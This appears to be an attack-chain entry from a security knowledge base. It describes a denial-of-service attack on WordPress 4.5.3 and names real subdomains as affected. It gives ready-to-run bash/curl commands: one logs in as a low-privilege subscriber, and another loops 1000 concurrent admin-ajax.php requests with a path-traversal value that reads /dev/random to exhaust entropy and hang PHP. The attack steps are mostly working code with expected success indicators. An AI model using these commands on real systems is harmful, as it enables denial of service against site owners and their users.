---
id: ac-wordpress-traversal-dos-entropy
tags:
  - wordpress
  - path-traversal
  - dos
  - entropy-depletion
  - csrf
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/bash]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/wordpress-authenticate-subscriber]]'
  - '[[procedures/wordpress-exploit-traversal-entropy]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[OS Exhaustion Flood]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:31:11.387Z'
description: >-
  Authenticated exploitation of path traversal in WordPress 4.5.3 Ajax handlers
  to read /dev/random repeatedly, depleting the entropy pool and causing PHP
  blocking for denial of service, potentially via CSRF.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[OS Exhaustion Flood]]'
  - '[[File and Directory Discovery]]'
---
# WordPress Path Traversal DoS via Authenticated Entropy Depletion

Multi-stage attack chain exploiting a path traversal vulnerability in WordPress Core Ajax handlers (version 4.5.3) to enable authenticated users, including subscribers, to read arbitrary files like /dev/random. Repeated reads deplete the system's entropy pool, causing PHP scripts to block and resulting in denial of service across affected subdomains such as news.instacart.com and tech.instacart.com. The flaw allows CSRF triggering due to delayed nonce validation, amplifying impact without direct user interaction.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Authenticate as Subscriber] --> B[Exploit Path Traversal for Entropy Depletion]
    B --> C[Denial of Service Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/bash]]

### Target Environment

- WordPress 4.5.3 on Linux with PHP and Apache
- Exposed wp-login.php and wp-admin/admin-ajax.php endpoints
- Valid subscriber credentials

### Initial Access Requirements

- Network access to the WordPress site (e.g., HTTP/HTTPS on port 80/443)
- Subscriber-level account (lowest privilege)
- No admin rights needed

## Detailed Attack Procedures

### Step 1: Authenticate as Subscriber
procedure: [[procedures/wordpress-authenticate-subscriber]]

**Objective**: Gain authenticated session as a subscriber to access Ajax handlers.

**Instructions**: Use [[commands/wordpress-login-curl]] to log in and capture session cookies:

```bash
cookiejar=$(mktemp) && curl --cookie-jar "$cookiejar" --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" "$target/wp-login.php" >/dev/null 2>&1
```

**Expected Output**: Session cookies saved to temporary file (output suppressed).

**Success Indicators**:
- Cookies generated without errors
- Subsequent requests with cookies return 200 OK from authenticated endpoints

### Step 2: Exploit Path Traversal for Entropy Depletion
procedure: [[procedures/wordpress-exploit-traversal-entropy]]

**Objective**: Send repeated requests to read /dev/random via path traversal, exhausting entropy and blocking PHP.

**Instructions**: After authentication, execute [[commands/wordpress-entropy-depletion-loop]] to send 1000 concurrent POST requests:

```bash
for i in `seq 1 1000`; do curl --cookie "$cookiejar" --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" "$target/wp-admin/admin-ajax.php" >/dev/null 2>&1 & done
```

Wait for requests to complete, then clean up with [[commands/cleanup-cookie-jar]]:

```bash
rm "$cookiejar"
```

**Expected Output**: Ajax responses suppressed; site becomes unresponsive due to PHP blocking on entropy waits.

**Success Indicators**:
- Increased load on server
- PHP processes hang or timeout
- Site denial of service observed (e.g., slow or failed loads on subdomains)

## Attack Chain Summary

### Key Achievements

1. Authenticated access to vulnerable Ajax endpoint using minimal privileges
2. Path traversal to arbitrary file read, targeting /dev/random for resource exhaustion
3. Achieved DoS via entropy depletion, exploitable via CSRF for broader impact

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[OS Exhaustion Flood]] OS Exhaustion Floods
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

---
*Last updated: 2023-10-01T00:00:00Z*
